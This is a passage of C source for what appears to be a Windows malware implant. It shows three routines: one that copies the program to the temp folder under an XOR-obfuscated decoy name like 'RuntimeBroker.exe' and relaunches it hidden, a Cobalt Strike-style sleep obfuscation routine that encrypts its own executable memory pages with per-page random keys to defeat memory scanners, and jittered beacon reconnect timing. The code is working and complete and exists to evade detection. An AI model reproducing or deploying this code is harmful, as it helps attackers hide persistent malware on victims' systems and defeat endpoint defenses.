     * Strategy: build dstPath first, compare with srcPath (case-insensitive
     * on Windows), and return FALSE immediately if they match so the caller
     * continues to the connect loop.
     */
    /*
     * The destination filename is decoded at runtime from a pre-XOR'd byte
     * array (MIGRATE_NAME_OBFUSCATED in config.h) so the plain string
     * "RuntimeBroker.exe" never appears in .rdata.
     * Override at build time: make ... MIGRATE_NAME=SearchIndexer.exe
     */
    char dstPath[MAX_PATH] = {0};
    if (!GetTempPathA(sizeof(dstPath) - 32, dstPath))
        return FALSE;

    /* Decode the obfuscated migrate-name onto the stack */
    char migName[32] = {0};
#if MIGRATE_NAME_LEN > 0
    {
        static const BYTE _obf[] = MIGRATE_NAME_OBFUSCATED;
        size_t _n = MIGRATE_NAME_LEN;
        if (_n >= sizeof(migName)) _n = sizeof(migName) - 1;
        for (size_t _i = 0; _i < _n; _i++)
            migName[_i] = (char)(_obf[_i] ^ MIGRATE_NAME_MASK);
        migName[_n] = '\0';
    }
#else
    /* Custom name supplied via -DMIGRATE_NAME_RAW="..." at build time */
    strncpy(migName, MIGRATE_NAME_RAW, sizeof(migName) - 1);
#endif

    strncat(dstPath, migName, sizeof(dstPath) - strlen(dstPath) - 1);
    SecureZeroMemory(migName, sizeof(migName));

    /* Already running from the destination — we are the migrated child.
     * Fall through to the connect loop instead of spawning again.       */
    if (_stricmp(srcPath, dstPath) == 0)
        return FALSE;

    /* ── 3. Copy ourselves to the temp path ─────────────────────────── */
    /* CopyFileA will overwrite silently if a stale copy is present       */
    if (!CopyFileA(srcPath, dstPath, FALSE))
        return FALSE;

    /* ── 4. Spawn the child (suspended so we can resume cleanly) ─────── */
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(
            dstPath,           /* lpApplicationName  */
            NULL,              /* lpCommandLine (NULL → use app name) */
            NULL, NULL,        /* process/thread security attrs */
            FALSE,             /* bInheritHandles */
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,              /* inherit environment */
            NULL,              /* inherit working directory */
            &si, &pi))
    {
        /* Clean up the temp copy on failure so we don't litter */
        DeleteFileA(dstPath);
        return FALSE;
    }

    /* ── 5. Resume child and exit ────────────────────────────────────── */
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* Give child a moment to start before we vanish (avoids a race where
     * the parent exits before the child has called CreateMutex)          */
    Sleep(300);
    ExitProcess(0);
}


/* ── Sleep obfuscation (APC-based, Foliage/Ekko style) ─────────────────── */
/*
 * obfuscate_sleep
 * ---------------
 * Cobalt Strike Beacon-class sleep obfuscation:
 *
 *   1. Generate a random 16-byte XOR key.
 *   2. XOR-encrypt all private RX pages via SC_NtWriteVirtualMemory —
 *      no VirtualProtect / RWX page.
 *   3. Queue an APC on the current thread to decrypt on wakeup.
 *   4. SleepEx(ms, TRUE) enters an alertable wait — during this window
 *      the thread is sleeping with all its code pages encrypted in RAM.
 *      A memory scanner sees only ciphertext.
 *   5. The wakeup APC fires, decrypts the pages, agent continues.
 *
 * When running injected inside a host process, skip page scrambling
 * entirely to avoid corrupting the host's code pages.
 *
 * Key is wiped with SecureZeroMemory after use.
 */

/* ── _is_injected ────────────────────────────────────────────────────────── */
static BOOL _is_injected(void)
{
    HMODULE hProcess = GetModuleHandleA(NULL);
    HMODULE hSelf    = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&_is_injected, &hSelf);
    return (hSelf != NULL) && (hSelf != hProcess);
}

/* ── Page region tracking ────────────────────────────────────────────────── */
#define MAX_REGIONS 256
typedef struct { PVOID base; SIZE_T size; } _Region;

static int _collect_rx_pages(_Region *out, int max)
{
    int count = 0;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;
    while (count < max && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if (mbi.State  != MEM_COMMIT)  continue;
        if (mbi.Type   != MEM_PRIVATE) continue;
        if (mbi.Protect != PAGE_EXECUTE_READ &&
            mbi.Protect != PAGE_EXECUTE_READWRITE) continue;
        out[count].base = mbi.BaseAddress;
        out[count].size = mbi.RegionSize;
        count++;
    }
    return count;
}

/* ── XOR pass via SC_NtWriteVirtualMemory (no RWX) ──────────────────────── */
/*
 * Per-page unique key — eliminates the repeating-key weakness.
 *
 * Previous design: one 16-byte key XOR'd modulo-16 across every page.
 * Weakness: any analyst with two memory snapshots of the same RX region
 * taken during different sleep intervals can XOR the two ciphertexts to
 * cancel the key and recover both plaintexts via known-plaintext attack.
 *
 * New design: BCryptGenRandom fills a key buffer exactly as large as the
 * page being encrypted.  Each page gets a completely independent, full-size
 * random key.  The key for page i is stored in ctx->keys[i] and wiped with
 * SecureZeroMemory after the APC decrypt fires.
 *
 * Cost: one BCryptGenRandom call per RX page (~12 KB average on the agent's
 * own working set, typically 3–6 pages).  BCryptGenRandom is fast (< 5 µs
 * per 4 KB on typical hardware) — imperceptible against the sleep interval.
 */
static void _xor_pages_keyed(_Region *regions, int count, BYTE **keys)
{
    HANDLE hSelf = GetCurrentProcess();
    for (int i = 0; i < count; i++) {
        SIZE_T sz  = regions[i].size;
        BYTE  *buf = (BYTE *)malloc(sz);
        if (!buf) continue;

        SIZE_T rd = 0;
        NTSTATUS ns = SC_NtReadVirtualMemory(hSelf, regions[i].base, buf, sz, &rd);
        if (NT_SUCCESS(ns) && rd == sz) {
            /* Full-size key — no repeating pattern */
            const BYTE *k = keys[i];
            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= k[j];
            SIZE_T wr = 0;
            SC_NtWriteVirtualMemory(hSelf, regions[i].base, buf, sz, &wr);
        }
        SecureZeroMemory(buf, sz);
        free(buf);
    }
}

/* ── APC decrypt context ─────────────────────────────────────────────────── */
/*
 * ctx->keys[i] points into ctx->keyData, a flat byte array.
 * Layout: [key_0 (regions[0].size bytes)] [key_1 (regions[1].size bytes)] ...
 * Total size = sum of all region sizes.
 *
 * The entire keyData block is wiped by SecureZeroMemory inside _apc_decrypt
 * before free(), leaving no key material in the heap after wakeup.
 */
typedef struct {
    _Region  regions[MAX_REGIONS];
    BYTE    *keys[MAX_REGIONS];     /* pointers into keyData                   */
    int      count;
    SIZE_T   keyDataSize;
    BYTE     keyData[1];            /* flexible array — alloc'd with malloc    */
} _SleepCtx;

static void NTAPI _apc_decrypt(ULONG_PTR param)
{
    _SleepCtx *ctx = (_SleepCtx *)param;
    _xor_pages_keyed(ctx->regions, ctx->count, ctx->keys);
    SecureZeroMemory(ctx->keyData, ctx->keyDataSize);
    free(ctx);
}

/* ── Public: obfuscate_sleep ─────────────────────────────────────────────── */
void obfuscate_sleep(DWORD ms)
{
    /* Injected into host process — just sleep, don't touch host pages */
    if (_is_injected() || !sc_ready()) {
        Sleep(ms);
        return;
    }

    /* Collect private RX pages — stack-allocated (no static, no data race) */
    _Region regions[MAX_REGIONS];
    int count = _collect_rx_pages(regions, MAX_REGIONS);
    if (count == 0) { Sleep(ms); return; }

    /* Compute total key material needed (one byte per page byte) */
    SIZE_T totalKeyBytes = 0;
    for (int i = 0; i < count; i++) totalKeyBytes += regions[i].size;
    if (totalKeyBytes == 0) { Sleep(ms); return; }

    /* Allocate the context with the keyData tail inline */
    SIZE_T ctxSize = offsetof(_SleepCtx, keyData) + totalKeyBytes;
    _SleepCtx *ctx = (_SleepCtx *)malloc(ctxSize);
    if (!ctx) { Sleep(ms); return; }

    /* Generate all key bytes in one BCryptGenRandom call */
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, ctx->keyData, (ULONG)totalKeyBytes,
            BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        SecureZeroMemory(ctx, ctxSize);
        free(ctx);
        Sleep(ms);
        return;
    }

    /* Assign per-page key pointers into the flat keyData block */
    ctx->count       = count;
    ctx->keyDataSize = totalKeyBytes;
    BYTE *kp = ctx->keyData;
    for (int i = 0; i < count; i++) {
        ctx->regions[i] = regions[i];
        ctx->keys[i]    = kp;
        kp             += regions[i].size;
    }

    /* Queue APC to decrypt on wakeup */
    QueueUserAPC(_apc_decrypt, GetCurrentThread(), (ULONG_PTR)ctx);

    /* Encrypt pages using per-page full-size keys */
    _xor_pages_keyed(regions, count, ctx->keys);

    /* Alertable sleep — APC fires on wakeup, decrypts+wipes keys, we continue */
    SleepEx(ms, TRUE);
    /* ctx is freed inside _apc_decrypt */
}
#undef MAX_REGIONS


/* ── jitter_sleep ────────────────────────────────────────────────────────── */
/*
 * Sleeps for a duration jittered ±RECONNECT_JITTER_PCT% around base_ms.
 *
 * Algorithm
 * ---------
 *  1. Generate 4 random bytes via BCryptGenRandom (same provider already used
 *     by obfuscate_sleep — no extra import).
 *  2. Compute a jitter window: window_ms = base_ms * RECONNECT_JITTER_PCT / 100
 *  3. Map the random uint32 to [0, 2*window_ms) and subtract window_ms to get
 *     a signed offset in [-window_ms, +window_ms).
 *  4. Clamp the result to [1 ms, DWORD_MAX] to guarantee a positive sleep.
 *
 * Example: base_ms=10000, RECONNECT_JITTER_PCT=30
 *   window_ms = 3000  →  actual sleep ∈ [7000 ms, 13000 ms]
 */
void jitter_sleep(DWORD base_ms)
{
    DWORD rnd = 0;
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, (BYTE *)&rnd, sizeof(rnd),
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        /* BCrypt unavailable — fall back to plain obfuscated sleep */
        obfuscate_sleep(base_ms);
        return;
    }

    /* window = base * jitter% / 100, clamped to at least 1 ms */
    DWORD window_ms = (DWORD)((ULONGLONG)base_ms * RECONNECT_JITTER_PCT / 100);
    if (window_ms == 0) window_ms = 1;

    /* Map rnd uniformly into [0, 2*window_ms), then shift to [-window, +window) */
    DWORD range   = 2 * window_ms;
    DWORD offset  = rnd % range;          /* [0, range)                          */
    LONG  delta   = (LONG)offset - (LONG)window_ms;  /* [-window, +window)       */

    LONG actual = (LONG)base_ms + delta;
    if (actual < 1) actual = 1;           /* never sleep 0 ms                    */

    obfuscate_sleep((DWORD)actual);
}
